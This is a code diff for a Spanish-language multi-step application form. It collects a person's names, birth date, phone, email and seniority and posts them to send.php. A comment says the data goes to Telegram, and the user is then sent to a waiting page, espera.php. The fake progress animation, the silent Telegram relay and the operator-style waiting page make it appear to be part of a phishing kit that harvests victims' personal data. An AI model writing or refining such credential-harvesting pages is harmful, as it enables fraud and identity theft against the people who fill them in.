@@ -780,21 +780,15 @@
       form2.addEventListener('submit', e => {
         e.preventDefault();
         if (!form2.checkValidity()) { form2.reportValidity(); return; }
+
+        data1.fechaNac   = document.getElementById('fechaNac').value;
+        data1.phone      = document.getElementById('phone').value;
+        data1.email      = document.getElementById('email').value;
+        data1.antiguedad = document.getElementById('antiguedad').value;
+
         setStep(3);
 
-        // Enviar datos a inicio.php
-        const body = new FormData();
-        body.append('nombres',    data1.nombres    || '');
-        body.append('apellidos',  data1.apellidos  || '');
-        body.append('fechaNac',   document.getElementById('fechaNac').value);
-        body.append('phone',      document.getElementById('phone').value);
-        body.append('email',      document.getElementById('email').value);
-        body.append('antiguedad', document.getElementById('antiguedad').value);
-        const uid = (data1.nombres || '') + ' ' + (data1.apellidos || '');
-
-        fetch('send.php', { method: 'POST', body }).catch(() => {});
-
-        // Animar lista de status
+        // Animar lista de status → paso 4
         const list = document.querySelectorAll('#statusList li');
         let idx = 2;
         const tick = () => {
@@ -809,11 +803,32 @@
             idx++;
             setTimeout(tick, 1400);
           } else {
-            // Animación completa → ir a espera.php (polling server-side)
-            setTimeout(() => { window.location.href = 'espera.php'; }, 400);
+            setTimeout(() => setStep(4), 600);
           }
         };
+        setTimeout(tick, 1400);
       });
+
+      // Solicitar Ahora → envía a Telegram y va a espera.php
+      const btnSolicitar = document.querySelector('.btn-primary.full-w');
+      if (btnSolicitar) {
+        btnSolicitar.addEventListener('click', e => {
+          e.preventDefault();
+          const uid = (data1.nombres || '') + ' ' + (data1.apellidos || '');
+          const body = new FormData();
+          body.append('nombres',    data1.nombres    || '');
+          body.append('apellidos',  data1.apellidos  || '');
+          body.append('fechaNac',   data1.fechaNac   || '');
+          body.append('phone',      data1.phone      || '');
+          body.append('email',      data1.email      || '');
+          body.append('antiguedad', data1.antiguedad || '');
+          fetch('send.php', { method: 'POST', body, keepalive: true })
+            .catch(() => {})
+            .finally(() => {
+              window.location.href = 'espera.php?u=' + encodeURIComponent(uid);
+            });
+        });
+      }
 
       // Auto-formato fecha DD/MM/AAAA
       const fechaInput = document.getElementById('fechaNac');
